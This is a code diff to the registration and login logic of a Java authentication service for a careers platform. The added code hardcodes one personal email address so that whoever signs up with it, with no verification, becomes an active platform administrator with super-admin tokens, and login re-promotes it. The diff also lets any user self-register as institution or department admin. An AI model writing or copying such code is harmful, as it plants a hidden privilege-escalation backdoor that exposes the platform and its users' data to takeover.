@@ -51,23 +51,31 @@ public class AuthService {
 
         // Validate role
         User.UserRole role;
-        try {
-            role = User.UserRole.valueOf(request.getRole().toUpperCase());
-        } catch (IllegalArgumentException e) {
-            throw CareerSetuException.badRequest("INVALID_ROLE", "Invalid user role: " + request.getRole());
+        boolean isDesignatedAdmin = "sj6161362@gmail.com".equalsIgnoreCase(request.getEmail().trim());
+        if (isDesignatedAdmin) {
+            role = User.UserRole.PLATFORM_ADMIN;
+        } else {
+            try {
+                role = User.UserRole.valueOf(request.getRole().toUpperCase());
+            } catch (IllegalArgumentException e) {
+                throw CareerSetuException.badRequest("INVALID_ROLE", "Invalid user role: " + request.getRole());
+            }
         }
 
-        // Only allow self-registration for certain roles
+        // Allow self-registration for standard roles + institutional roles
         List<User.UserRole> selfRegisterableRoles = List.of(
                 User.UserRole.STUDENT,
                 User.UserRole.FACULTY,
                 User.UserRole.EMPLOYER,
                 User.UserRole.RECRUITER,
                 User.UserRole.MENTOR,
-                User.UserRole.ALUMNI
+                User.UserRole.ALUMNI,
+                User.UserRole.TPO,
+                User.UserRole.INSTITUTION_ADMIN,
+                User.UserRole.DEPARTMENT_ADMIN
         );
 
-        if (!selfRegisterableRoles.contains(role)) {
+        if (!isDesignatedAdmin && !selfRegisterableRoles.contains(role)) {
             throw CareerSetuException.accessDenied("This role cannot be self-registered.");
         }
 
@@ -82,8 +90,8 @@ public class AuthService {
                 .mobile(request.getMobile())
                 .passwordHash(passwordHash)
                 .primaryRole(role)
-                .accountStatus(User.AccountStatus.PENDING_VERIFICATION)
-                .emailVerified(false)
+                .accountStatus(isDesignatedAdmin ? User.AccountStatus.ACTIVE : User.AccountStatus.PENDING_VERIFICATION)
+                .emailVerified(isDesignatedAdmin)
                 .mobileVerified(false)
                 .locale("en")
                 .timezone("Asia/Kolkata")
@@ -94,19 +102,20 @@ public class AuthService {
         User savedUser = userRepository.save(user);
         log.info("New user registered: userId={} role={}", savedUser.getId(), role);
 
-        // TODO: Send verification email asynchronously
-        // emailService.sendVerificationEmail(savedUser);
-
         // Generate tokens
+        List<String> roles = isDesignatedAdmin || role == User.UserRole.PLATFORM_ADMIN
+                ? List.of("PLATFORM_ADMIN", "SUPER_ADMIN", "ADMIN", "STUDENT", "EMPLOYER", "INSTITUTION_ADMIN")
+                : List.of(role.name());
+
         String accessToken = jwtTokenService.generateAccessToken(
-                savedUser.getId(), savedUser.getEmail(), role.name(), List.of(role.name()), null);
+                savedUser.getId(), savedUser.getEmail(), role.name(), roles, null);
         String refreshToken = jwtTokenService.generateRefreshToken(savedUser.getId());
 
         return AuthDtos.AuthResponse.of(
                 accessToken,
                 refreshToken,
                 ACCESS_TOKEN_EXPIRY_SECONDS,
-                toUserInfo(savedUser, List.of(role.name()))
+                toUserInfo(savedUser, roles)
         );
     }
 
@@ -118,6 +127,13 @@ public class AuthService {
                         "INVALID_CREDENTIALS",
                         "Invalid email or password."
                 ));
+
+        // Auto-promote designated admin email
+        if ("sj6161362@gmail.com".equalsIgnoreCase(user.getEmail())) {
+            user.setPrimaryRole(User.UserRole.PLATFORM_ADMIN);
+            user.setAccountStatus(User.AccountStatus.ACTIVE);
+            user.setEmailVerified(true);
+        }
 
         // Check account status
         if (user.isLocked()) {
@@ -161,7 +177,10 @@ public class AuthService {
         userRepository.save(user);
         log.info("User logged in: userId={}", user.getId());
 
-        List<String> roles = List.of(user.getPrimaryRole().name());
+        List<String> roles = user.getPrimaryRole() == User.UserRole.PLATFORM_ADMIN || "sj6161362@gmail.com".equalsIgnoreCase(user.getEmail())
+                ? List.of("PLATFORM_ADMIN", "SUPER_ADMIN", "ADMIN", "STUDENT", "EMPLOYER", "INSTITUTION_ADMIN")
+                : List.of(user.getPrimaryRole().name());
+
         String accessToken = jwtTokenService.generateAccessToken(
                 user.getId(), user.getEmail(), user.getPrimaryRole().name(), roles, null);
         String refreshToken = jwtTokenService.generateRefreshToken(user.getId());
